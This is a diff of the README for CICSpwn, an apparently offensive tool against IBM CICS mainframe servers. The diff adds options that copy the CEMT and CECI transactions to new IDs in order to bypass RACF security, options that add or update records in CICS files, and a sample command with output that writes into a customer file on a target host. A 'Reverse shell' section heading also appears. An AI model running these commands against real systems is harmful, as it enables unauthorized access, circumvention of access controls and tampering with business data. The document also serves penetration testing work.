@@ -37,7 +37,7 @@ optional arguments:
   -a APPLID, --applid APPLID
                         CICS ApplID on VTAM, default is CICS
 
-Information gathering:
+General information:
   -A, --all             Gather all information about a CICS Transaction Server
   -i, --info            Gather basic information about a CICS region
   -u, --userids         Scrape userids found in different menus
@@ -48,6 +48,14 @@ Information gathering:
                         action
   --ceci CECI           CECI new transaction name. Result of -i option.
   --cemt CEMT           CEMT new transaction name. Result of -i option.
+  --bypass              if CEDA is available, it copies CEMT and CECI to new
+                        transid which bypasses RACF
+  -b OLD_TRAN           if CEDA is available, it copies OLD_TRAN to NEW TRAN
+                        (-n option) to bypass RACF. if no NEW TRAN is
+                        specified, CICSpwn chooses an IBM supplied transaction
+                        always available
+  -n NEW_TRAN           if CEDA is available, it copies OLD_TRAN (-b) to NEW
+                        TRAN to bypass RACF
 
 Storage options:
   -f, --files           List all installed files a on TS CICS
@@ -56,6 +64,10 @@ Storage options:
                         status of the file if it's not enabled, opened or
                         readable
   --get-tsq TSQ_NAME    Get the content of a temporary storage queue.
+  --add-item FILENAME_ADD
+                        Add an item (--num) in FILE
+  --num ITEM            # item to read/add/update from a file or TSQueue
+  --data DATA           file containing new data to update the file
   --enable-files ENA_FILES
                         Enable a file (keyword ALL to enable every file)
 
@@ -64,6 +76,12 @@ Transaction options:
   --enable-trans ENA_TRANS
                         Enable a transaction (keyword ALL to enable every
                         transaction)
+  --check-trans CHECK_TRANS
+                        Checks security access to the transactions specified
+                        in <file.txt>
+  --check-files CHECK_FILES
+                        Checks security access to the files specified in
+                        <file.txt>
 
 Access options:
   -U USERID, --userid USERID
@@ -91,6 +109,7 @@ JOB options:
   --jcl JCL             Custom JCL file to provide
   --rexx REXX_FILE      Custom REXX file to execute in memory. No label or
                         line continuation must be present in the file
+
 
 ```
 ## Prerequisites 
@@ -139,8 +158,21 @@ root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --get-file FILEA
 RECORD 1
 RECORD 2
 ...
+```  
+Ps: adding --num option fetches only one record
+
+## Add a record to a file
+```
+root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --add-item CUSTMAS --num 400018 --data file.txt
+[[+] Connecting to target 192.168.1.201:23
+[*] Access to CICS Terminal is possible with APPID CICS
+[*] File CUSTMAS is enabled and open
+[*] Record size: 118	keylength:6
+[+] Adding record 400018 of file CUSTMAS
+[*] item 400018 was added successfully to file CUSTMAS
 
 ```
+PS: if record number 400018 exists, CICSpwn updates the record automatically so please be careful.
 
 ## List TSQueues
 ```
@@ -164,9 +196,7 @@ root@kali:~/cics# python cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 -
 [*] Successful authentication
 [+] Activating ALL transactions
 [*] All transactions are enabled
-
 ...
-
 ```
 
 ## Reverse shell using CICSpwn
